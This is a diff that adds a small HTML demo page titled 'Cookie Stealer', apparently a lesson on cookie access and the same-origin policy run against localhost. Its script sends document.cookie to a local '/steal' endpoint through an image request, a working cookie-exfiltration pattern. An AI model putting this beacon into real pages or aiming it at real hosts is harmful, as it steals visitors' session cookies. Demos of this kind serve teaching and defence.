@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang='en'>
+    <head>
+	<meta charset='utf-8' />
+	<title>Cookie Stealer</title>
+
+    </head>
+    <body>
+    <h1>I don't want oatmeal raison, I want chocolate chip!</h1>
+
+    I'm stealing the chocolate chip cookie!
+    <p>
+    <p>
+
+    <script>
+        document.cookie = 'foo=oatmealraisin'
+        const iframe = document.createElement('iframe')
+        iframe.src='http://localhost:4001/'
+        document.body.appendChild(iframe)
+        document.write(iframe.contentDocument.cookie)
+        console.log(iframe.contentDocument.cookie)
+
+        setTimeout(function() {
+        const p = document.createElement('p')
+        p.innerHTML = document.cookie
+        document.body.appendChild(p)
+
+        new Image().src = 'http://localhost:4001/steal?cookie=' + document.cookie
+    }, 5000);
+    </script>
+    </body>
+
+</html>
